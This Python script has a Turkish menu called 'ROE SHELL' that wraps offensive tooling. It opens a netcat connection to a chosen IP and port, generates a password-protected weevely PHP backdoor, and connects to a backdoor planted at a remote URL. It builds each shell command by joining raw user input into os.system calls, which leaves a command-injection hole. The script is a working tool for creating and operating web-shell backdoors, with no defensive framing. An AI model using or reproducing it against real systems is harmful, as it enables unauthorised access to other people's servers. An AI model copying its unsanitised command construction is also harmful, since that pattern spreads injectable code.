import os 

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet ROE SHELL")

while True:
    print("""
      
      HOŞGELDİN SEÇ 

      1) DİNLEME AL
      2) BACKDOOR OLUŞTUR
      3) BACKDOOR DİNLE
      4) YARDIM
      5) ÇIKIŞ      
      
      """)
    secim = input("Lütfen Seçenek Seçin (1-5): ")

    if secim == "1":
        print("Dinleme alma seçildi.")
        ip = input("Lütfen dinleyeceğiniz IP adresini girin: ")
        port = input("Lütfen port girin: ")
        os.system("nc " + ip + " " + port)

    elif secim == "2":
        print("Backdoor oluşturma seçildi.")
        şifre = input("Lütfen Dosya için şifre girin: ")
        dosyayolu = input("Lütfen dosyanın kaydedileceği yeri seçin: ")
        os.system("weevely generate " + şifre + " " + dosyayolu)

    elif secim == "3":
        print("Backdoor dinleme seçildi.")
        url = input("Lütfen backdoorun olduğu url'yi girin: ")
        sfr = input("Lütfen Oluşturduğunuz Şifreyi Girin: ")
        os.system("weevely " + url + " " + sfr)

    elif secim == "4":
        print("Yardım seçildi.")

    elif secim == "5":
        print("Çıkılıyor...")
        exit()

    else:
        print("Geçersiz seçenek! Lütfen 1-5 arasında bir seçenek girin.")
